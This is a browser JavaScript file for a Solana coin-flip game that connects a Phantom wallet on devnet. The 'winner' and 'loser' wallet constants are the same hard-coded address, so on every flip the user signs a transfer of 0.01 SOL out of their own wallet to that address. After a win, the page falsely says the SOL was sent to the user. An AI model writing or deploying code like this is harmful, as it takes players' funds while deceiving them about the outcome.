document.addEventListener('DOMContentLoaded', () => {
    let connection;
    let userPublicKey;
    const winnerWallet = "BvKeWCU3nsfW5VpzKhMd7atD5i5qeEQ2ga2t5coDagNr";
    const loserWallet = "BvKeWCU3nsfW5VpzKhMd7atD5i5qeEQ2ga2t5coDagNr";

    async function connectWallet() {
        if (window.solana && window.solana.isPhantom) {
            try {
                await window.solana.connect();
                userPublicKey = window.solana.publicKey;
                document.getElementById("wallet-address").innerText = `Wallet connected: ${userPublicKey.toString()}`;
                document.getElementById("wallet-address").style.display = "block";
                document.getElementById("connect-wallet-btn").style.display = "none";
                document.getElementById("game-container").style.display = "block";

                // Initialize the connection to Solana devnet
                connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'), 'confirmed');
            } catch (err) {
                console.log('Connection error: ', err);
            }
        } else {
            alert("Please install Phantom wallet.");
        }
    }

    async function flipCoin(choice) {
        const result = Math.random() < 0.5 ? "Heads" : "Tails";
        const outcomeText = `The coin landed on: ${result}`;

        document.getElementById("result").innerText = outcomeText;

        if (choice === result) {
            await sendSolToWallet(winnerWallet);
            document.getElementById("result").innerText += " You Win! SOL has been sent to your wallet.";
        } else {
            await sendSolToWallet(loserWallet);
            document.getElementById("result").innerText += " You Lose! SOL has been sent to the loser wallet.";
        }
    }

    async function sendSolToWallet(destinationWallet) {
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: userPublicKey,
                toPubkey: new solanaWeb3.PublicKey(destinationWallet),
                lamports: solanaWeb3.LAMPORTS_PER_SOL / 100, // 0.01 SOL
            })
        );

        const { blockhash } = await connection.getRecentBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = userPublicKey;

        const signedTransaction = await window.solana.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
        await connection.confirmTransaction(signature);

        console.log(`Transaction successful. Signature: ${signature}`);
    }

    document.getElementById("connect-wallet-btn").addEventListener("click", connectWallet);
    document.getElementById("heads-btn").addEventListener("click", () => flipCoin("Heads"));
    document.getElementById("tails-btn").addEventListener("click", () => flipCoin("Tails"));
});
